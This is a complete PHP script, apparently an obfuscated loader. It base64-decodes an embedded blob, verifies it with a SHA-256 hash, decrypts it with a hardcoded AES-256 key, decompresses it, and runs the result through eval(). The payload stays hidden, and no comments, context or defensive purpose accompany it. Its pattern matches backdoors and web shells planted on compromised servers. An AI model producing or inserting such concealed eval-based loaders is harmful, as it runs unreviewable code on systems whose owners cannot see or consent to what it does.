<?php function cGyUtMJv($x)
{
    return base64_decode($x);
}
function UKAPbHMG($data, $key)
{
    $iv = substr(sha1($key), 0, 16);
    return openssl_decrypt($data, 'AES-256-CBC', $key, 0, $iv);
}
$GadFjeSJ = "Nk8rSXFCTjFtdWUzbGFZTGloaUVhSDYrcWpTNEFtTUI5dWYzV2QrOXdKYUM2emR1WWYrSERWbC9QTzVjMVg1Kzo6OTQwNzU4ZGVhNjA3ZDNhOTVkNTc4NTAxN2FmMTZlMWYwYzAxNjc0Mjc0ZjQwYzIzZDc0NTA4MGYxZGM0ZjMyZQ==";
$XMyODlJK = cGyUtMJv($GadFjeSJ);
list($a, $b) = explode('::', $XMyODlJK);
if ($b !== hash('sha256', $a)) {
    die('Signature error');
}
$decrypted = gzuncompress(UKAPbHMG($a, '72f8dc7fdca7208e02f5d8443ef53782376202227be21a705a4a67b247b81067'));
eval('?>' . $decrypted);
